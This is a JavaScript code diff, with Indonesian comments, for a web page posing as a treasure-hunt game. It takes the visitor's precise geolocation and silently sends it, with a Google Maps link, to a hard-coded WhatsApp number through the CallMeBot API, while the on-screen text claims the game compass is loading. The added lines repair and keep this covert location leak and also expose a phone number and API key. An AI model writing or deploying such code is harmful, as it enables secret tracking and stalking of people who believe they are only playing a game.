@@ -34,28 +34,19 @@ function mulaiMisi(){
             let lat = pos.coords.latitude;
             let long = pos.coords.longitude;
 
-     navigator.geolocation.getCurrentPosition(
-    function(pos){
-        let lat = pos.coords.latitude;
-        let long = pos.coords.longitude;
+            status.innerHTML = "📍 Lokasi ditemukan!<br>Memuat peta harta karun...";
 
-        status.innerHTML = "📍 Lokasi ditemukan!<br>Memuat peta harta karun...";
+            // Memperbaiki tanda $ yang hilang pada variabel lat dan long
+            let pesan = `🎮 Player memulai misi\n\n📍 Latitude: ${lat}\n📍 Longitude: ${long}\n\n🗺️ https://maps.google.com/?q=${lat},${long}`;
+            let nomor = "6287894025536";
+            let apikey = "4901523";
 
-        let pesan = `🎮 Player memulai misi\n\n📍 Latitude: ${lat}\n📍 Longitude: ${long}\n\n🗺️ https://maps.google.com/?q=${lat},${long}`;
-        let nomor = "6287894025536";
-        let apikey = "4901523";
-        let api = `https://api.callmebot.com/whatsapp.php?phone=${nomor}&text=${encodeURIComponent(pesan)}&apikey=${apikey}`;
+            let api = `https://api.callmebot.com/whatsapp.php?phone=${nomor}&text=${encodeURIComponent(pesan)}&apikey=${apikey}`;
 
-        // PERBAIKAN: Masukkan kembali kode pengalihan ini yang terhapus
-        window.location.href = api;
-        
-        status.innerHTML = `✅ Server terhubung!<br><br>Membuka kompas game...`;
-    },
-    function(){
-        status.innerHTML = "❌ Gagal: Akses lokasi ditolak atau belum diizinkan.";
-    },
-    { enableHighAccuracy: true, timeout: 5000 }
-);;
+            // Langsung alihkan halaman ke WhatsApp secara instan
+            window.location.href = api;
+            
+            status.innerHTML = `✅ Server terhubung!<br><br>Membuka kompas game...`;
         },
         function(){
             status.innerHTML = "❌ Gagal: Akses lokasi ditolak atau belum diizinkan.";
